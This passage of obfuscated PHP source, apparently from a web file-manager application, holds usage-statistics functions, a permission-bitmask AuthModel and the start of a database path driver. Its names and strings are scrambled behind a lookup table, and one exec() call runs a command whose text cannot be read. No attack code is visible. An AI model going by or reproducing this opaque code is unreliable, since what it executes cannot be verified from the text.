date($¯Ü¾¡Éí[1914], $¸¦ºáÍ¤); $¸¦ºáÍ¤ = strtotime($¯Ü¾¡Éí[1917], $¸¦ºáÍ¤); } return $ß¯ê½µµ; } public function _recordUser($Åßê±² = '') { $ò¨šÊÃÇ =& $_SERVER[§Êá¸İ]; $£”’³Ü = strtotime(date($ò¨šÊÃÇ[1918], strtotime($Åßê±²))); $ƒ¨È‘˜ = strtotime(date($ò¨šÊÃÇ[1919], strtotime($Åßê±²))); $ÄÓû”ìó = array($ò¨šÊÃÇ[231] => array($ò¨šÊÃÇ[1101], $ƒ¨È‘˜)); $¤Ó´àêä = Model($ò¨šÊÃÇ[606])->where($ÄÓû”ìó)->count($ò¨šÊÃÇ[1779]); $ÄÓû”ìó[$ò¨šÊÃÇ[231]] = array($ò¨šÊÃÇ[409], array($£”’³Ü, $ƒ¨È‘˜)); $ÇşÚíá¥ = Model($ò¨šÊÃÇ[606])->where($ÄÓû”ìó)->count($ò¨šÊÃÇ[1779]); $ÄÓû”ìó[$ò¨šÊÃÇ[33]] = $ò¨šÊÃÇ[1920]; $‰Ì¿öØú = Model($ò¨šÊÃÇ[1921])->where($ÄÓû”ìó)->count($ò¨šÊÃÇ[1922]); $…ÀÎ‹Î÷ = array($ò¨šÊÃÇ[255] => $Åßê±², $ò¨šÊÃÇ[852] => (int) $¤Ó´àêä, $ò¨šÊÃÇ[1907] => (int) $ÇşÚíá¥, $ò¨šÊÃÇ[1908] => (int) $‰Ì¿öØú); return $this->insert($…ÀÎ‹Î÷); } public function _recordStore($«ãˆ’â¨ = '') { $›²ÚÈî¸ =& $_SERVER[§Êá¸İ]; $´¨¡éÕ = strtotime(date($›²ÚÈî¸[1919], strtotime($«ãˆ’â¨))); $ì—àŸª” = array($›²ÚÈî¸[231] => array($›²ÚÈî¸[1101], $´¨¡éÕ)); $¢£¬øèƒ = Model($›²ÚÈî¸[552])->where($ì—àŸª”)->sum($›²ÚÈî¸[79]); $ì—àŸª”[$›²ÚÈî¸[493]] = 0; $ü²³¶‰… = Model($›²ÚÈî¸[911])->where($ì—àŸª”)->sum($›²ÚÈî¸[79]); $ì—àŸª”[$›²ÚÈî¸[190]] = 1; $È¸õçÒÉ = Model($›²ÚÈî¸[911])->where($ì—àŸª”)->sum($›²ÚÈî¸[79]); $ì—àŸª”[$›²ÚÈî¸[190]] = 2; $À ÔÜ´ = Model($›²ÚÈî¸[911])->where($ì—àŸª”)->sum($›²ÚÈî¸[79]); $äÀÖÔÆè = array($›²ÚÈî¸[255] => $«ãˆ’â¨, $›²ÚÈî¸[850] => (int) $ü²³¶‰…, $›²ÚÈî¸[1911] => (int) $¢£¬øèƒ, $›²ÚÈî¸[1912] => (int) $È¸õçÒÉ, $›²ÚÈî¸[1913] => (int) $À ÔÜ´); return $this->insert($äÀÖÔÆè); } public function trend($Ï™‹Ãà¡, $º½õÓµ˜) { $ÅƒÜ·üª =& $_SERVER[§Êá¸İ]; if (!$this->init($Ï™‹Ãà¡)) { return !1; } $ûæ€–˜… = $this->trendList($Ï™‹Ãà¡); if ($ûæ€–˜… && $º½õÓµ˜ != $ÅƒÜ·üª[1752]) { $ƒÈò˜º = $ûæ€–˜…[0][$ÅƒÜ·üª[255]]; $Íç…ªØö = $this->validDate($º½õÓµ˜, $ƒÈò˜º); $‰³¡ü¡ë = array(); $©¯ãÓí• = array_to_keyvalue($ûæ€–˜…, $ÅƒÜ·üª[255]); foreach ($Íç…ªØö as $™€Îº¨‘) { if (isset($©¯ãÓí•[$™€Îº¨‘])) { $ÓÑ²©¶Ä = $©¯ãÓí•[$™€Îº¨‘]; } else { $ÓÑ²©¶Ä = end($ûæ€–˜…); $ÓÑ²©¶Ä[$ÅƒÜ·üª[255]] = $™€Îº¨‘; if ($Ï™‹Ãà¡ == $ÅƒÜ·üª[670]) { $ÓÑ²©¶Ä[$ÅƒÜ·üª[1907]] = $ÓÑ²©¶Ä[$ÅƒÜ·üª[1908]] = 0; } } $‰³¡ü¡ë[] = $ÓÑ²©¶Ä; } $ûæ€–˜… = $‰³¡ü¡ë; } $ß…åİ§¡ = array($ÅƒÜ·üª[670] => array($ÅƒÜ·üª[852] => LNG($ÅƒÜ·üª[1923]), $ÅƒÜ·üª[1907] => LNG($ÅƒÜ·üª[1924]), $ÅƒÜ·üª[1908] => LNG($ÅƒÜ·üª[1925])), $ÅƒÜ·üª[1909] => array($ÅƒÜ·üª[850] => LNG($ÅƒÜ·üª[1926]), $ÅƒÜ·üª[1911] => LNG($ÅƒÜ·üª[1927]), $ÅƒÜ·üª[1912] => LNG($ÅƒÜ·üª[1928]), $ÅƒÜ·üª[1913] => LNG($ÅƒÜ·üª[1929]))); $ Ê×àºô = array($ÅƒÜ·üª[670] => $ÅƒÜ·üª[1930], $ÅƒÜ·üª[1909] => $ÅƒÜ·üª[79]); if (empty($ûæ€–˜…)) { $™€Îº¨‘ = date($ÅƒÜ·üª[1914], strtotime($ÅƒÜ·üª[1915])); $Ç­¨ª†î = array($ÅƒÜ·üª[255] => $™€Îº¨‘); foreach ($ß…åİ§¡[$Ï™‹Ãà¡] as $²•òúã => $÷ÍŠÔ) { $Ç­¨ª†î[$²•òúã] = 0; } $ûæ€–˜…[] = $Ç­¨ª†î; } $–Â‘ûÌ“ = array(); foreach ($ûæ€–˜… as $÷ÍŠÔ) { if ($Ï™‹Ãà¡ == $ÅƒÜ·üª[1909] && $÷ÍŠÔ[$ÅƒÜ·üª[1911]] > $÷ÍŠÔ[$ÅƒÜ·üª[850]]) { $÷ÍŠÔ[$ÅƒÜ·üª[1911]] = $÷ÍŠÔ[$ÅƒÜ·üª[850]]; } foreach ($ß…åİ§¡[$Ï™‹Ãà¡] as $²•òúã => $¶Æ†ôõ) { $ÓÑ²©¶Ä = array($ÅƒÜ·üª[255] => $÷ÍŠÔ[$ÅƒÜ·üª[255]], $ÅƒÜ·üª[1668] => $¶Æ†ôõ); $ÓÑ²©¶Ä[$ Ê×àºô[$Ï™‹Ãà¡]] = isset($÷ÍŠÔ[$²•òúã]) ? $÷ÍŠÔ[$²•òúã] : 0; $–Â‘ûÌ“[] = $ÓÑ²©¶Ä; } } return $–Â‘ûÌ“; } public function validDate($™ª÷ñçó, $àúÏì§») { $»±«©Ë =& $_SERVER[§Êá¸İ]; $°Êü„¶ = date($»±«©Ë[1914], strtotime($»±«©Ë[1915])); $ÁÚè®êÖ = array($°Êü„¶); switch ($™ª÷ñçó) { case $»±«©Ë[1759]: $Î±‘‹ˆ = mktime(0, 0, 0, date($»±«©Ë[1931]), date($»±«©Ë[1459]) - date($»±«©Ë[1549]) + 7 - 7, date($»±«©Ë[1932])); $‰Ç¢ç‚Û = 0; do { $ÍÔş¾¥Ö = date($»±«©Ë[1914], $Î±‘‹ˆ - 3600 * 24 * 7 * $‰Ç¢ç‚Û); $ÁÚè®êÖ[] = $ÍÔş¾¥Ö; $‰Ç¢ç‚Û++; } while ($àúÏì§» < $ÍÔş¾¥Ö); break; case $»±«©Ë[1757]: $‰Ç¢ç‚Û = 1; do { $»ÓóÖ‚À = date($»±«©Ë[1933], strtotime("\55\x20{$‰Ç¢ç‚Û}\40\x6d\157\x6e\164\x68\163")); $ÁÚè®êÖ[] = $»ÓóÖ‚À; $‰Ç¢ç‚Û++; } while ($àúÏì§» < $»ÓóÖ‚À); break; case $»±«©Ë[1934]: $Ùæà§ÀÊ = (int) date($»±«©Ë[1932], strtotime($àúÏì§»)); $²«» ´™ = (int) date($»±«©Ë[1932]); if ($Ùæà§ÀÊ >= $²«» ´™) { break; } for ($Ùæà§ÀÊ; $Ùæà§ÀÊ < $²«» ´™; $Ùæà§ÀÊ++) { $ÁÚè®êÖ[] = $Ùæà§ÀÊ . $»±«©Ë[1935]; } break; default: break; } if ($àúÏì§» > end($ÁÚè®êÖ)) { array_pop($ÁÚè®êÖ); } sort($ÁÚè®êÖ); return $ÁÚè®êÖ; } public function listTable($ò¯õÒïï) { $øîêœŠ = ucfirst($ò¯õÒïï); return Model($øîêœŠ)->listData(); } public function option($Ò˜ñã÷İ) { $ÎŸìäÅ = $_SERVER[§Êá¸İ][1936] . ucfirst($Ò˜ñã÷İ); return $this->{$ÎŸìäÅ}(); } private function optionUser() { $èï·¥«ù =& $_SERVER[§Êá¸İ]; $¸ğÔÄšÍ = Model($èï·¥«ù[606])->count($èï·¥«ù[1779]); $çêä“İ„ = Model($èï·¥«ù[606])->where($èï·¥«ù[1937])->count($èï·¥«ù[1779]); $ëïßæÛı = intval($GLOBALS[$èï·¥«ù[6]][$èï·¥«ù[425]][$èï·¥«ù[1725]]) / 3600; $ù„Í±ª› = strtotime("\55{$ëïßæÛı}\40\x68\157\165\x72\163"); $Â‚¼éèÃ = strtotime(date($èï·¥«ù[1918])); if ($ù„Í±ª› < $Â‚¼éèÃ) { $ù„Í±ª› = $Â‚¼éèÃ; } $ÌÀàÅ½å = array($èï·¥«ù[1938] => array($èï·¥«ù[1102], $ù„Í±ª›)); $˜Â«‹… = (int) Model($èï·¥«ù[606])->where($ÌÀàÅ½å)->count($èï·¥«ù[1779]); if (!$˜Â«‹…) { $˜Â«‹… = 1; } $ÌÀàÅ½å = array($èï·¥«ù[1938] => array($èï·¥«ù[1102], $Â‚¼éèÃ)); $áÃ±èêı = Model($èï·¥«ù[606])->where($ÌÀàÅ½å)->count($èï·¥«ù[1779]); return array($èï·¥«ù[845] => (int) $¸ğÔÄšÍ, $èï·¥«ù[1939] => (int) ($¸ğÔÄšÍ - $çêä“İ„), $èï·¥«ù[1940] => (int) $çêä“İ„, $èï·¥«ù[1941] => (int) $áÃ±èêı, $èï·¥«ù[1942] => $˜Â«‹…); } private function optionFile() { $õãúñàÏ =& $_SERVER[§Êá¸İ]; $£»ÓÎ´ = $this->sourceSize(); $­èÖ…û¨ = $£»ÓÎ´[$õãúñàÏ[79]]; $‘¼ì§ó = $£»ÓÎ´[$õãúñàÏ[1911]]; $ëá¾©üñ = Model($õãúñàÏ[911])->where(array($õãúñàÏ[493] => 0))->count($õãúñàÏ[193]); $‹ê”Æû = array($õãúñàÏ[493] => 0, $õãúñàÏ[231] => array($õãúñàÏ[1102], strtotime(date($õãúñàÏ[1918])))); $ÓØ³˜¡­ = Model($õãúñàÏ[911])->where($‹ê”Æû)->sum($õãúñàÏ[79]); $°¿Š¡¤£ = Model($õãúñàÏ[911])->where($‹ê”Æû)->count($õãúñàÏ[193]); return array($õãúñàÏ[850] => $­èÖ…û¨, $õãúñàÏ[1911] => $‘¼ì§ó, $õãúñàÏ[1943] => $­èÖ…û¨ - $‘¼ì§ó, $õãúñàÏ[1944] => (int) $ÓØ³˜¡­, $õãúñàÏ[852] => (int) $ëá¾©üñ, $õãúñàÏ[1945] => (int) $°¿Š¡¤£); } private function optionAccess() { $¥éøšºã =& $_SERVER[§Êá¸İ]; return array($¥éøšºã[845] => $this->typeLogCnt(), $¥éøšºã[110] => $this->typeLogCnt($¥éøšºã[110]), $¥éøšºã[533] => $this->typeLogCnt($¥éøšºã[533]), $¥éøšºã[1946] => $this->typeLogCnt($¥éøšºã[1946]), $¥éøšºã[1947] => $this->typeLogCnt($¥éøšºã[1947]), $¥éøšºã[670] => $this->typeLogCnt($¥éøšºã[12], $¥éøšºã[1922])); } private function typeLogCnt($áà’ûï = '', $½ÛÅğ’Á = "\151\x64") { $Ì°«ÕØö =& $_SERVER[§Êá¸İ]; $–Şµ ë = array($Ì°«ÕØö[110] => array($Ì°«ÕØö[1948], $Ì°«ÕØö[1949]), $Ì°«ÕØö[533] => array($Ì°«ÕØö[1950], $Ì°«ÕØö[1951]), $Ì°«ÕØö[1946] => array($Ì°«ÕØö[1952], $Ì°«ÕØö[1953], $Ì°«ÕØö[1954]), $Ì°«ÕØö[1947] => array($Ì°«ÕØö[1955], $Ì°«ÕØö[1956]), $Ì°«ÕØö[1957] => array($Ì°«ÕØö[1958], $Ì°«ÕØö[1959], $Ì°«ÕØö[1960])); $„İ§²ì  = strtotime(date($Ì°«ÕØö[1918])); $Â÷ÄØÊ¬ = array($Ì°«ÕØö[231] => array($Ì°«ÕØö[1102], $„İ§²ì )); if ($áà’ûï) { $Â÷ÄØÊ¬[$Ì°«ÕØö[33]] = array($Ì°«ÕØö[7], $–Şµ ë[$áà’ûï]); } $×æª±–’ = Model($Ì°«ÕØö[1921])->where($Â÷ÄØÊ¬)->count($½ÛÅğ’Á); return (int) $×æª±–’; } private function optionServer() { $öªäÛÚø =& $_SERVER[§Êá¸İ]; $Ìµ¡Á¾Œ = $this->diskDriver(); $Õ›¤ë°™ = KodIO::defaultDriver(); $ßÀìŞÒ‘ = array($öªäÛÚø[904] => $Õ›¤ë°™[$öªäÛÚø[483]]); $š¼šöĞ = Model($öªäÛÚø[552])->where($ßÀìŞÒ‘)->sum($öªäÛÚø[79]); $è÷Á‘ = explode($öªäÛÚø[53], $_SERVER[$öªäÛÚø[147]]); $ÄŞÇœ† = $è÷Á‘[0]; $Î”èûÃİ = $GLOBALS[$öªäÛÚø[6]][$öªäÛÚø[21]]; $óÆİŠ¶Ÿ = $Î”èûÃİ[$öªäÛÚø[1064]]; if ($óÆİŠ¶Ÿ == $öªäÛÚø[1052]) { $­Œœ±ƒ = explode($öªäÛÚø[1378], $Î”èûÃİ[$öªäÛÚø[1063]]); $óÆİŠ¶Ÿ = $­Œœ±ƒ[0]; } if ($óÆİŠ¶Ÿ == $öªäÛÚø[999] || $óÆİŠ¶Ÿ == $öªäÛÚø[891]) { $Ò‰Ù“™î = Model()->db()->query($öªäÛÚø[1961]); $Ÿ™¢¡ú = $Ò‰Ù“™î[0] && isset($Ò‰Ù“™î[0][$öªäÛÚø[1667]]) ? $Ò‰Ù“™î[0][$öªäÛÚø[1667]] : 0; $óÆİŠ¶Ÿ = $öªäÛÚø[1962] . ($Ÿ™¢¡ú ? $öªäÛÚø[8] . $Ÿ™¢¡ú : $öªäÛÚø[12]); } $ü’€ú¿ø = $GLOBALS[$öªäÛÚø[6]][$öªäÛÚø[425]][$öªäÛÚø[913]]; return array($öªäÛÚø[1963] => $Ìµ¡Á¾Œ ? $Ìµ¡Á¾Œ[$öªäÛÚø[1964]] : 0, $öªäÛÚø[1965] => $Ìµ¡Á¾Œ ? $Ìµ¡Á¾Œ[$öªäÛÚø[1966]] : 0, $öªäÛÚø[1967] => (int) $Õ›¤ë°™[$öªäÛÚø[1964]] * 1024 * 1024 * 1024, $öªäÛÚø[1968] => (int) $š¼šöĞ, $öªäÛÚø[1969] => ucfirst($ÄŞÇœ†), $öªäÛÚø[1970] => $öªäÛÚø[1971] . PHP_VERSION, $öªäÛÚø[1972] => phpBuild64() ? 64 : 32, $öªäÛÚø[844] => str_replace($öªäÛÚø[1221], $öªäÛÚø[1080], $óÆİŠ¶Ÿ), $öªäÛÚø[425] => ucfirst($ü’€ú¿ø), $öªäÛÚø[32] => $_SERVER[$öªäÛÚø[1973]]); } private function diskDriver() { $şÛ‡‰½û =& $_SERVER[§Êá¸İ]; $ÏñŠÄÍõ = $şÛ‡‰½û[8]; $Ÿ­Åêşó = $GLOBALS[$şÛ‡‰½û[6]][$şÛ‡‰½û[1395]] == $şÛ‡‰½û[1396]; if ($Ÿ­Åêşó) { $ÏñŠÄÍõ = $şÛ‡‰½û[1974]; if (function_exists($şÛ‡‰½û[1975])) { exec($şÛ‡‰½û[1976], $Ñ‚ø¦õ); $ÏñŠÄÍõ = $Ñ‚ø¦õ[1] . $şÛ‡‰½û[8]; } } if (!file_exists($ÏñŠÄÍõ)) { return; } if (!function_exists($şÛ‡‰½û[1977])) { return; } $õÊàÀ¹ô = @disk_total_space($ÏñŠÄÍõ); $ûòÈ—°¾ = $õÊàÀ¹ô - @disk_free_space($ÏñŠÄÍõ); return array($şÛ‡‰½û[1964] => $õÊàÀ¹ô, $şÛ‡‰½û[1966] => $ûòÈ—°¾); } public function fileChart($Ÿü×˜‚Œ) { $ã„Œƒ ™ =& $_SERVER[§Êá¸İ]; if (isset($Ÿü×˜‚Œ[$ã„Œƒ ™[1779]])) { return Model($ã„Œƒ ™[911])->userFileTypeProfile($Ÿü×˜‚Œ[$ã„Œƒ ™[1779]]); } if (isset($Ÿü×˜‚Œ[$ã„Œƒ ™[1978]])) { return Model($ã„Œƒ ™[911])->groupFileTypeProfile($Ÿü×˜‚Œ[$ã„Œƒ ™[1978]]); } $»¢„ç—· = $this->sourceSize(); $±íÒÉë­ = array($ã„Œƒ ™[192] => 0, $ã„Œƒ ™[190] => 1); $ŠûüÃ®„ = Model($ã„Œƒ ™[911])->where($±íÒÉë­)->sum($ã„Œƒ ™[79]); $±íÒÉë­[$ã„Œƒ ™[190]] = 2; $í‘º½ŠŒ = Model($ã„Œƒ ™[911])->where($±íÒÉë­)->sum($ã„Œƒ ™[79]); return array($ã„Œƒ ™[850] => $»¢„ç—·[$ã„Œƒ ™[79]], $ã„Œƒ ™[1911] => $»¢„ç—·[$ã„Œƒ ™[1911]], $ã„Œƒ ™[1912] => (int) $ŠûüÃ®„, $ã„Œƒ ™[1913] => (int) $í‘º½ŠŒ); } private function sourceSize() { $¦á‰Æ½Á =& $_SERVER[§Êá¸İ]; $†´µ¤” = Model($¦á‰Æ½Á[911])->where(array($¦á‰Æ½Á[493] => 0))->sum($¦á‰Æ½Á[79]); $ó¯»‘×Ñ = Model($¦á‰Æ½Á[552])->sum($¦á‰Æ½Á[79]); if ($ó¯»‘×Ñ > $†´µ¤”) { $ó¯»‘×Ñ = $†´µ¤”; } return array($¦á‰Æ½Á[79] => (int) $†´µ¤”, $¦á‰Æ½Á[1911] => (int) $ó¯»‘×Ñ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Äß˜ª” =& $_SERVER[§Êá¸İ]; $ßÑÂ¹Øì = array(array($Äß˜ª”[502] => LNG($Äß˜ª”[1979]), $Äß˜ª”[1980] => $Äß˜ª”[1981], $Äß˜ª”[1982] => 1, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Äß˜ª”[502] => LNG($Äß˜ª”[1985]), $Äß˜ª”[1980] => $Äß˜ª”[1986], $Äß˜ª”[1982] => 2, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Äß˜ª”[502] => LNG($Äß˜ª”[1987]), $Äß˜ª”[1980] => $Äß˜ª”[1988], $Äß˜ª”[1982] => 3, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Äß˜ª”[502] => LNG($Äß˜ª”[1989]), $Äß˜ª”[1980] => $Äß˜ª”[1990], $Äß˜ª”[1982] => 4, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_VIEW), array($Äß˜ª”[502] => LNG($Äß˜ª”[1991]), $Äß˜ª”[1980] => $Äß˜ª”[1992], $Äß˜ª”[1982] => 5, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Äß˜ª”[502] => LNG($Äß˜ª”[1993]), $Äß˜ª”[1980] => $Äß˜ª”[1994], $Äß˜ª”[1982] => 6, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Äß˜ª”[502] => LNG($Äß˜ª”[1995]), $Äß˜ª”[1980] => $Äß˜ª”[1996], $Äß˜ª”[1982] => 7, $Äß˜ª”[1983] => 1, $Äß˜ª”[1984] => 0)); return $ßÑÂ¹Øì; } public static function authCheck($Æóå¿»š, $“¸à¥¥«) { $‡¹»Œí™ =& $_SERVER[§Êá¸İ]; $Æóå¿»š = intval($Æóå¿»š); if (KodUser::isRoot() && $GLOBALS[$‡¹»Œí™[6]][$‡¹»Œí™[1997]]) { return !0; } if ($Æóå¿»š <= 0) { return !1; } if (($Æóå¿»š & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Æóå¿»š & $“¸à¥¥«); } public static function authCheckShow($“´ãÕ¨) { return self::authCheck($“´ãÕ¨, self::AUTH_SHOW); } public static function authCheckView($ç­¢Ç³) { return self::authCheck($ç­¢Ç³, self::AUTH_VIEW); } public static function authCheckDownload($•ûÛµŠ¹) { return self::authCheck($•ûÛµŠ¹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($­¼´ñ†) { return self::authCheck($­¼´ñ†, self::AUTH_UPLOAD); } public static function authCheckEdit($–®Åº½) { return self::authCheck($–®Åº½, self::AUTH_EDIT); } public static function authCheckRemove($æË—€¹û) { return self::authCheck($æË—€¹û, self::AUTH_REMOVE); } public static function authCheckShare($¨†¯Ã½) { return self::authCheck($¨†¯Ã½, self::AUTH_SHARE); } public static function authCheckComment($”™†æ×) { return self::authCheck($”™†æ×, self::AUTH_COMMENT); } public static function authCheckEvent($°å‡û©Ú) { return self::authCheck($°å‡û©Ú, self::AUTH_EVENT); } public static function authCheckRoot($¦˜Ò¿¡) { return self::authCheck($¦˜Ò¿¡, self::AUTH_ROOT); } public static function authCheckAction($£àéÕÈ, $Ì°ı¸¡) { $ÕÄ¿œ® =& $_SERVER[§Êá¸İ]; $í­˜éÔª = array($ÕÄ¿œ®[1998] => self::AUTH_VIEW, $ÕÄ¿œ®[1289] => self::AUTH_DOWNLOAD, $ÕÄ¿œ®[110] => self::AUTH_UPLOAD, $ÕÄ¿œ®[1947] => self::AUTH_EDIT, $ÕÄ¿œ®[1946] => self::AUTH_REMOVE, $ÕÄ¿œ®[1957] => self::AUTH_SHARE, $ÕÄ¿œ®[430] => self::AUTH_COMMENT, $ÕÄ¿œ®[1767] => self::AUTH_EVENT, $ÕÄ¿œ®[1999] => self::AUTH_ROOT); if (!isset($í­˜éÔª[$Ì°ı¸¡])) { return; } $”å×ºÎ = $í­˜éÔª[$Ì°ı¸¡]; $£àéÕÈ = intval($£àéÕÈ); if ($£àéÕÈ <= 0) { return !1; } if (($£àéÕÈ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($£àéÕÈ & $”å×ºÎ); } public static function authDisable($Šóœ¦‚õ, $ÏÌÄ¶Ğ) { if (intval($Šóœ¦‚õ) <= 0) { return 0; } return intval($Šóœ¦‚õ) & ~$ÏÌÄ¶Ğ; } public $optionType = "\x53\171\163\164\x65\155\56\163\157\165\x72\x63\x65\101\165\164\150\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\x68", "\154\141\x62\x65\154", "\144\x69\x73\x70\x6c\x61\x79", "\163\171\163\164\145\x6d", "\163\x6f\x72\x74"); public function initData() { $èÍá½íü = $this->authDefault(); foreach ($èÍá½íü as $Ëî÷ßÒó) { $this->add($Ëî÷ßÒó); } } public function findAuth($«÷œÃûš, $¨õ¨’Òı) { $®ÄÌêı =& $_SERVER[§Êá¸İ]; $Ÿ¹²‰¿ß = parent::listData(); foreach ($Ÿ¹²‰¿ß as $Ş‘˜§ã­) { $’¦€¹Ş½ = intval($Ş‘˜§ã­[$®ÄÌêı[495]]); if ($’¦€¹Ş½ <= 0 || $Ş‘˜§ã­[$®ÄÌêı[2000]] == 0) { continue; } if (($’¦€¹Ş½ & $«÷œÃûš) != $«÷œÃûš) { continue; } if (($’¦€¹Ş½ & $¨õ¨’Òı) != 0) { continue; } return $Ş‘˜§ã­[$®ÄÌêı[483]]; } return !1; } public function findAuthReadOnly() { $Ó¤”¦Êé = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $‘É‰‡Ô‘ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ó¤”¦Êé, $‘É‰‡Ô‘); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $‹Ú“éÔ =& $_SERVER[§Êá¸İ]; $¨şëàÁâ = parent::listData(); $«”òöÏñ = !1; foreach ($¨şëàÁâ as $í†ƒŒ¦ö) { if ($í†ƒŒ¦ö[$‹Ú“éÔ[495]] <= 0 || $í†ƒŒ¦ö[$‹Ú“éÔ[2000]] == $‹Ú“éÔ[228]) { continue; } if (!$«”òöÏñ) { $«”òöÏñ = $í†ƒŒ¦ö; continue; } if ($«”òöÏñ[$‹Ú“éÔ[495]] > $í†ƒŒ¦ö[$‹Ú“éÔ[495]]) { $«”òöÏñ = $í†ƒŒ¦ö; } } return $«”òöÏñ ? $«”òöÏñ[$‹Ú“éÔ[483]] : $‹Ú“éÔ[12]; } public function listData($°¯¯ô€á = false, $ÚıÙÔî¨ = "\x73\x6f\162\x74", $ÂÇæü¡¬ = false) { return parent::listData($°¯¯ô€á, $ÚıÙÔî¨, $ÂÇæü¡¬); } public function update($ê°„Ó®, $«›ÙñÆ„) { $ÓµïÏËé =& $_SERVER[§Êá¸İ]; $êï¬×°œ = parent::listData($ê°„Ó®); $‘Û¯ì§ = $this->findByName($«›ÙñÆ„[$ÓµïÏËé[32]]); if (!$êï¬×°œ || $‘Û¯ì§ && $‘Û¯ì§[$ÓµïÏËé[483]] != $êï¬×°œ[$ÓµïÏËé[483]]) { return !1; } $this->filterAuth($«›ÙñÆ„[$ÓµïÏËé[495]]); return parent::update($ê°„Ó®, $«›ÙñÆ„); } public function remove($®Ü¬¾˜ ) { $½öÍú«™ = parent::listData($®Ü¬¾˜ ); if (!$½öÍú«™ || $½öÍú«™[$_SERVER[§Êá¸İ][191]]) { return !1; } return parent::remove($®Ü¬¾˜ ); } public function add($›•á«ÎÜ = array()) { $ÖŞ›ÖÍ† =& $_SERVER[§Êá¸İ]; if ($this->findByName($›•á«ÎÜ[$ÖŞ›ÖÍ†[32]])) { return !1; } $Ÿ…Ù¯ = array($ÖŞ›ÖÍ†[32] => $ÖŞ›ÖÍ†[12], $ÖŞ›ÖÍ†[495] => 1, $ÖŞ›ÖÍ†[2001] => $ÖŞ›ÖÍ†[1988], $ÖŞ›ÖÍ†[2000] => 1, $ÖŞ›ÖÍ†[191] => 0, $ÖŞ›ÖÍ†[2002] => 0); $›•á«ÎÜ = array_merge($Ÿ…Ù¯, $›•á«ÎÜ); $›•á«ÎÜ[$ÖŞ›ÖÍ†[2002]] = $this->getSort(); $this->filterAuth($›•á«ÎÜ[$ÖŞ›ÖÍ†[495]]); return parent::insert($›•á«ÎÜ); } private function getSort() { $Ù•ãóäÂ =& $_SERVER[§Êá¸İ]; $á‹ıŠìª = parent::listData(); $õïºè¿À = array_to_keyvalue($á‹ıŠìª, $Ù•ãóäÂ[12], $Ù•ãóäÂ[2002]); return empty($õïºè¿À) ? 0 : max($õïºè¿À) + 1; } private function filterAuth(&$é»îËÕ­) { if (!$é»îËÕ­) { return; } $Ü§­ËÁÂ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $µ¢Â”å¡ = array(); foreach ($Ü§­ËÁÂ as $Ê«òîš) { if ($é»îËÕ­ & $Ê«òîš) { $µ¢Â”å¡[] = $Ê«òîš; } } if (in_array(self::AUTH_ROOT, $µ¢Â”å¡)) { $é»îËÕ­ = array_sum($Ü§­ËÁÂ); return; } $µ÷¶²˜‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($µ¢Â”å¡ as $Ê«òîš) { if (isset($µ÷¶²˜‚[$Ê«òîš])) { $µ¢Â”å¡ = array_merge($µ¢Â”å¡, $µ÷¶²˜‚[$Ê«òîš]); } } $µ¢Â”å¡[] = self::AUTH_SHOW; $é»îËÕ­ = array_sum(array_unique($µ¢Â”å¡)); } public function sort($‰¸£«Ñ, $ªàÅëú) { return parent::update($‰¸£«Ñ, $ªàÅëú); } } goto fŞ«ç«î; Càçóòø†˜: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¸Õ„»§â) { $this->pathParse = $¸Õ„»§â; $this->model = Model($_SERVER[§Êá¸İ][1428]); } public function getPath($îŸèÄé¬) { return trim($îŸèÄé¬, $_SERVER[§Êá¸İ][8]); } public function pathFather($±Ãƒ»Ğˆ) { $•Û˜Äé = $this->parse($±Ãƒ»Ğˆ); $•Û˜Äé = $this->infoSimple($±Ãƒ»Ğˆ); return $•Û˜Äé ? 